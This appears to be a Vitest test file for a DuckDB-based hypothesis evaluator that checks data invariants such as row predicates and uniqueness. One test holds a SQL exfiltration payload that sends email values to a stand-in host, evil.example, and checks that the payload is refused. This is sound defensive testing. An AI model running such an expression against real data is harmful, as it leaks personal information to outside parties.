import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { writeFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { createTestConnection, type TestConn } from "./helpers/duckdb";
import { evaluateHypothesis, violationCountQuery } from "@/lib/hypotheses/evaluate";
import type { Hypothesis } from "@/lib/hypotheses/schema";
import { collapseShape } from "@/lib/profile/shapes";
import { CSV_FIXTURE } from "./fixtures";

let conn: TestConn;
const COLUMNS = ["id", "email", "full_name", "ssn", "amount", "created_at", "active", "notes"];

const hypothesis = (over: Partial<Hypothesis> & { check: Hypothesis["check"] }): Hypothesis => ({
  id: "h", title: "t", rationale: "r", columns: [], severity: "medium", ...over,
});

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const evaluate = (h: Hypothesis) => evaluateHypothesis(conn as any, h, COLUMNS, 6);

beforeAll(async () => {
  conn = await createTestConnection();
  const dir = mkdtempSync(path.join(tmpdir(), "duck-invariant-eval-"));
  const csv = path.join(dir, "fixture.csv");
  writeFileSync(csv, CSV_FIXTURE);
  await conn.query(`CREATE OR REPLACE TABLE data AS SELECT * FROM read_csv_auto('${csv}')`);
}, 180_000);

afterAll(() => conn?.close());

describe("evaluateHypothesis", () => {
  it("reports HOLDS when nothing violates the predicate", async () => {
    const r = await evaluate(hypothesis({ check: { kind: "row_predicate", expression: "id > 0" } }));
    expect(r.status).toBe("holds");
  });

  it("reports FALSIFIED with a count and percentage", async () => {
    // One row has amount = -3.25.
    const r = await evaluate(hypothesis({ check: { kind: "row_predicate", expression: "amount >= 0" } }));
    expect(r.status).toBe("falsified");
    if (r.status !== "falsified") throw new Error("unreachable");
    expect(r.violations).toBe(1);
    expect(r.pct).toBeCloseTo(100 / 6, 1);
  });

  it("treats a NULL predicate as passing", async () => {
    // ssn is NULL on one row; a NULL comparison must not count as a violation.
    const r = await evaluate(hypothesis({ check: { kind: "row_predicate", expression: "length(ssn) = 11" } }));
    expect(r.status).toBe("holds");
  });

  it("detects duplicate key combinations", async () => {
    // Rows 1 and 4 share an email/ssn pair.
    const r = await evaluate(hypothesis({ check: { kind: "unique", columns: ["email", "ssn"] } }));
    expect(r.status).toBe("falsified");
    if (r.status !== "falsified") throw new Error("unreachable");
    expect(r.violations).toBe(2);

    const unique = await evaluate(hypothesis({ check: { kind: "unique", columns: ["id"] } }));
    expect(unique.status).toBe("holds");
  });

  it("skips rather than throws when the model invents a column", async () => {
    const r = await evaluate(hypothesis({ check: { kind: "row_predicate", expression: "no_such_column > 0" } }));
    expect(r.status).toBe("skipped");
    if (r.status !== "skipped") throw new Error("unreachable");
    expect(r.reason).toMatch(/no_such_column/i);
  });

  it("refuses an exfiltration attempt before DuckDB ever sees it", async () => {
    const r = await evaluate(
      hypothesis({
        check: {
          kind: "row_predicate",
          expression: "read_csv('https://evil.example/?d=' || email) IS NOT NULL",
        },
      }),
    );
    expect(r.status).toBe("skipped");
    if (r.status !== "skipped") throw new Error("unreachable");
    expect(r.reason).toMatch(/external data/i);
  });

  it("refuses unknown columns in a unique check", async () => {
    const r = await evaluate(hypothesis({ check: { kind: "unique", columns: ["nope"] } }));
    expect(r.status).toBe("skipped");
  });
});

describe("violationCountQuery", () => {
  it("always selects a single count from our own table", () => {
    const sql = violationCountQuery(
      hypothesis({ check: { kind: "row_predicate", expression: "amount >= 0" } }),
      COLUMNS,
    );
    expect(sql).toBe(
      "SELECT count(*) AS violations FROM data WHERE NOT coalesce((amount >= 0), true)",
    );
  });
});

describe("collapseShape", () => {
  it("collapses runs of three or more and leaves short runs alone", () => {
    expect(collapseShape("aaaaaaa9999@aaaa.aaa")).toBe("a{7}9{4}@a{4}.a{3}");
    expect(collapseShape("aa9@a")).toBe("aa9@a");
    expect(collapseShape("")).toBe("");
  });
});
